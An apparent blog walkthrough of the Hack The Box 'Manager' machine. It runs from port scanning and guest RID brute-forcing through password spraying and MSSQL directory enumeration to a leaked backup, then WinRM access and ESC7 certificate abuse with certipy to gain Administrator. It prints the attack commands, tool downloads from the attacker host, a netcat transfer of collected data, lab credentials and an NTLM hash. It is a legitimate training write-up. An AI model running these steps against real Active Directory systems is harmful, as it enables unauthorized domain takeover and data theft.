---
title: "Manager - Hack The Box"
date: 2023-10-21
description: "My walkthrough for manager machine on HTB."
tags: ["Windows", "Medium", "ESC7", "RID bruteforce", "password spray", "MSSQL"]
feature: "feature.png"
---

![HTB Manager](feature.png)

## Enumeration
- As usual, I started by scanning the open ports to get an initial view of the exposed services.

```shell
sudo nmap -Pn -p- $IP -oN Manager_ports -v
```

```
Nmap scan report for 10.129.45.63
Host is up (0.070s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49695/tcp open  unknown
49728/tcp open  unknown
49773/tcp open  unknown
49796/tcp open  unknown
61794/tcp open  unknown
```

- Let’s move on to service enumeration and run the default NSE scripts.

```shell
grep -oP '^\d+/tcp' Manager_ports | cut -d/ -f1 | paste -sd, - 
```

```shell
sudo nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49693,49694,49695,49728,49773,49796,61794 -A $IP -oN Manager_services -v
```

```
Nmap scan report for DC01.manager.htb (10.129.45.63)
Host is up (0.11s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-04 16:21:01Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-04T16:22:39+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
|_SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
|_SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
|_ssl-date: 2026-02-04T16:22:39+00:00; +7h00m02s from scanner time.
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.45.63:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.45.63:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-04T15:53:38
| Not valid after:  2056-02-04T15:53:38
| MD5:   bbd0:e2e9:69d1:ea44:f434:f549:6531:3e37
|_SHA-1: 23db:4197:5004:ddf1:fe93:8b2e:ec22:3958:32dd:f160
|_ssl-date: 2026-02-04T16:22:39+00:00; +7h00m02s from scanner time.
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
|_SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
|_ssl-date: 2026-02-04T16:22:39+00:00; +7h00m02s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
|_SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
|_ssl-date: 2026-02-04T16:22:39+00:00; +7h00m02s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open     msrpc         Microsoft Windows RPC
49695/tcp open     msrpc         Microsoft Windows RPC
49728/tcp open     msrpc         Microsoft Windows RPC
49773/tcp filtered unknown
49796/tcp open     msrpc         Microsoft Windows RPC
61794/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-time: 
|   date: 2026-02-04T16:21:58
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   122.06 ms 10.10.16.1
2   122.24 ms DC01.manager.htb (10.129.45.63)
```

- In addition to the default ports of a domain controller, there are ports `80`, `1433 MSSQL` and `5985 winrm`.
## SMB Enumeration
- As usual, I started by testing `Null authentication`. However, although it is enabled, I was unable to enumerate shares, users, or proceed with an `RID brute-force`.

```shell
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u '' -p '' --rid
```

![](Images/smb%20null%20auth.png)

- The `guest` account was enabled, which allowed us to access information that could not be obtained through `Null authentication`. The only useful information I could gather from this was a list of usernames and groups via RID brute‑forcing.

```shell
nxc smb $IP -u 'guest' -p '' --shares #Account enabled ! We can enumerate shares
nxc smb $IP -u 'guest' -p '' --users #We can't enumerate users
nxc smb $IP -u 'guest' -p '' --rid > output.txt #We can bruteforce by rid
```

![](Images/guest%20account%20enabled.png)

- I used `awk` to parse `output.txt` and generate two distinct files: one containing `users.txt` and the other containing `groups.txt`.

```shell
awk '
/SidTypeGroup/ {
    if (match($0, /MANAGER\\([^ ]+) \(/, a))
        print tolower(a[1]) >> "groups.txt"
}
/SidTypeUser/ {
    if (match($0, /MANAGER\\([^ ]+) \(/, a))
        print tolower(a[1]) >> "users.txt"
}
' output.txt
```
## Web enumeration
-  I inspected the HTTP response headers with `curl`, hoping to discover a `domain.htb`, but accessing the application via the IP address returned a `200` response instead :p

```shell
curl -i "http://$IP"
```

![](Images/curl%20output%20result.png)

- When we visited the website, it appeared to be completely static! (●__●)

![](Images/Static%20manager%20website.png)

- Since I didn’t get anything useful, I kept enumerating and moved on to exploring the `technologies` used in web.
### Technologies used
![](Images/wappalyzer%20output.png)

- Nothing interesting !

```shell
whatweb 
#http://10.129.70.125/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.70.125], JQuery[3.4.1], Microsoft-IIS[10.0], Script[text/javascript], Title[Manager], X-UA-Compatible[IE=edge]
```

- Same results as `Wappalyzer` ! 
### Directory/file bruteforce
```shell
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
```

![](Images/Directory%20bruteforce.png)

- Visiting the `/js` and `/images` directories returned an `Access Denied`, so it was time to look elsewhere.

![](Images/Access%20denied%20web.png)
## Password Spraying
- The `web` was a dead end, I will try to password spray using each user's name as their password : 

```shell
nxc smb $IP -u users.txt -p users.txt --no-brute --continue-on-success 
```

![](Images/password%20spray%20and%20operator%20creds%20retrieved.png)

- We eventually obtained a valid authentication hit, revealing that the `operator` account was using its username as his password.

>[!Note]
>When I ran `nxc smb $IP -u 'guest' -p '' --rid`, I obtained the account `MANAGER\Operator (SidTypeUser)`. Initially, I kept the username casing as returned, and when I fed the resulting `users.txt` file to `nxc` for password spraying, `Operator/Operator` was automatically used, which led to a dead end because the actual password was lowercase. This highlighted why it is best practice to normalize enumerated usernames to lowercase when performing common box-style attacks such as spraying usernames as passwords. I explicitly say _boxes_ here because, in real enterprise environments, a password policy is almost always enforced, and scenarios where such weak credentials are allowed are extremely rare.
## Bloodhound enumeration
- With the credentials I found, I’ll run `BH` to check whether `operator` user has any interesting `ACLs` that can be abused.

```shell
sudo timedatectl set-ntp 0
sudo rdate -n $IP
sudo bloodhound-python -u 'operator' -p 'operator' -d manager.htb -ns $IP -c all --zip
```

![](Images/No%20ACLs%20for%20operator%20user.png)

- There is nothing interesting ! I inspected `Remote Management users` group and I found that `raven` is its sole member, which makes this account a clear and valuable target moving forward ✪ ω ✪
## MSSQL enumeration
- With the creds found, it is time to inspect `MSSQL` server : 

```sql
SELECT name FROM sys.databases; -- default databases

SELECT name FROM master.sys.server_principals;

/*
name            
-------------   
sa              
public          
sysadmin        
securityadmin   
serveradmin     
setupadmin      
processadmin    
diskadmin       
dbcreator       
bulkadmin       
BUILTIN\Users 
*/

SELECT * FROM fn_my_permissions(NULL, 'SERVER');

/*
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         
server                         VIEW ANY DATABASE   
*/

EXEC sp_linkedservers; -- No linked server

EXEC sp_configure 'show advanced options', 1;

-- ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.

SELECT * FROM OPENROWSET( BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB ) AS Contents;

-- ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to use the bulk load statement.

EXEC master..xp_dirtree 'C:\', 1, 1; -- It worked
```

![](Images/read%20files%20through%20dirtree.png)

- I was able to enumerate directories using `EXEC master..xp_dirtree` (Thanks hackviser cheatsheet); however, I could not list the contents of `C:\Users\Raven`. This behavior is due to **NTFS ACL** restrictions, as the account under which the MSSQL Server service is running does not have sufficient permissions to access `Raven’s` user profile directory. Once access is obtained as `Raven`, we can compare the ACLs of `C:\Users\Raven` and `C:\Windows` to better illustrate why directory enumeration succeeds in one case but fails in the other.

- Let's do more digging and inspect the web folder since there is an exposed web service : 

```sql
EXEC master..xp_dirtree 'C:\inetpub', 1, 1;
EXEC master..xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

![](Images/Inetpub%20directory%20discovery%20through%20xdirtree.png)

- Browsing to `http://$IP/web.config` returned a `404 Not Found`. However, when accessing `http://$IP/website-backup-27-07-23-old.zip`, an archive was downloaded. Let’s inspect it.

```shell
unzip website-backup-27-07-23-old.zip -d website
```

![](Images/archive%20downloaded.png)

![](Images/raven%20creds%20found.png)

- We got our new creds : `raven/R4v3nBe5tD3veloP3r!123`
## Shell as raven
```shell
evil-winrm -i $IP -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
```

- Let's grab `user.txt` : 

![](Images/user%20flag.png)

- Flag : **{06fcec96b6eec372ffaa627743febc5f}**

- We discussed earlier why we couldn’t list the contents of `C:\Users\Raven`, attributing it to **NTFS ACLs**. Let’s take a closer look at the permissions to see this in detail :

```shell
icacls C:\Users\Raven
```

![](Images/raven%20folder%20acls.png)

- The security context in which `xp_dirtree` runs is the SQL Server service account which is `NT SERVICE\MSSQL$SQLEXPRESS`. This account does not appear in the ACLs of `C:\Users\Raven`, so access is denied, whereas it effectively has read access to `C:\Windows` because service accounts are evaluated as part of `BUILTIN\Users`, which is explicitly granted `RX` permissions on the Windows directory.

![](Images/windows%20acls.png)
## Shell as Administrator
- Now that I am connected as `raven`, I will run SharpHound to determine whether this user has any interesting ACLs that can be abused. I will upload `SharpHound.exe` and anso `nc.exe` since this is how I usually transfer the SharpHound ZIP output from the Windows box back to my machine.

```shell
iwr -Uri "http://10.10.15.241/nc.exe" -Outfile nc.exe
iwr -Uri "http://10.10.15.241/SharpHound.exe" -Outfile SharpHound.exe

.\SharpHound.exe -c All --zipfilename manager #Collect data
cmd /c ".\nc.exe 10.10.15.241 1234 < 20260209134604_manager.zip" #Send the zip file to my listener on my attacking machine

nc -lvnp 1234 > 20260209134604_manager.zip #My listener waiting for data
```

- I will quickly check that the ZIP file wasn’t corrupted during the transfer.

```shell
sha256sum 20260209134604_manager.zip
#7da7814759f414df61f47c58562c0dbbc14d16982dd3d3476808caba0dcb6d7e

Get-FileHash -Path "20260209134604_manager.zip"
#7DA7814759F414DF61F47C58562C0DBBC14D16982DD3D3476808CABA0DCB6D7E
```

![](Images/file%20hash%20on%20windows.png)

![](Images/file%20hash%20on%20Linux.png)

 - Let’s analyse the data we gathered as `raven`; the goal here is to inspect his `outgoing control objects` and identify any relationships or permissions that could be abused for further escalation. 

![ADCS manager](Images/ADCS%20manager.png)

- Apparently, there is a CA in place and the user has the `ManageCA` right. He is also a member of the `Certificate Service DCOM Access` group. Next, I’ll run `certipy` to check for any vulnerable certificate templates and inspect the output.

>[!Note]
>If a user is a member of `Certificate Service DCOM Access` `and nothing else`, they can precisely `connect to the Certificate Authority over DCOM/RPC` and perform `non-administrative` interactions with the CA, such as submitting certificate requests via RPC (instead of HTTP), querying CA properties and configuration (CA name, CA cert, enrollment endpoints, policies), checking the status of their own requests, and enumerating certain CA metadata; they `cannot` approve or deny requests, issue or revoke certificates, modify CA settings, manage templates, or affect other users’ certificates,

```shell
certipy find -dc-ip $IP -u raven -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

![](Images/certipy%20for%20vuln%20templates.png)

- When it comes to privilege escalation through AD CS misconfigurations, the `certipy` wiki is my go-to reference: [https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation). According to `certipy`, the user `Raven` holds dangerous rights (`Enroll` and `ManageCA`), which directly enables the **ESC7** attack path, fully described and documented in the repository.

1. The below command uses the `Manage CA` privilege to add `raven` to the officer role in case we need to explicitly act as a **Certificate Officer** to approve a request.

```shell
certipy ca \ 
    -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip 10.129.117.16 -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -add-officer 'raven'
#[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

2. The below command uses `Manage CA` to make the `SubCA` template available for requests. (`ie.` Using `Manage CA` rights, the attacker ensures the `SubCA` template is published by the target CA.)

```shell
certipy ca \
    -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip $IP -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -enable-template 'SubCA'
#[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

3. The attacker requests a certificate for a privileged user (e.g., Administrator) via the `SubCA` template. If the attacker lacks direct enrollment rights on this specific template, the request is denied but a request ID is generated. The associated private key from the CSR must be saved.

```shell
certipy req \
    -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip $IP -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -template 'SubCA' \
    -upn 'administrator@manager.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
```

![](Images/request%20certificate%20via%20subCA.png)

4. The attacker, leveraging the capabilities granted by `Manage CA` (including effective officer functions, possibly via role self-assignment as in Step 1), approves the previously denied request.

```shell
certipy ca \ 
    -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip $IP -target 'dc01.manager.htb' \          
    -ca 'manager-DC01-CA' -issue-request '20'
    
#[*] Successfully issued certificate request ID 20
```

5. The attacker retrieves the now-approved certificate, using the request ID and the private key saved in Step 3.

```shell
certipy req \
    -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip $IP -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -retrieve '20'
```

![](Images/successfuly%20retrieved%20the%20certificate%20for%20administrator.png)

- We will use our certificate to authenticate as `Administrator`.

```shell
certipy auth -pfx administrator.pfx -dc-ip $IP
```

![](Images/administrator%20hash.png)

- I will use `impacket-psexec` to login :

```shell
impacket-psexec -hashes :ae5064c2f62317332c88629e025924ef administrator@manager.htb
```

![](Images/Root%20flag.png)

- Flag : **{166d303f9d04fed732a0dabf38a93051}**




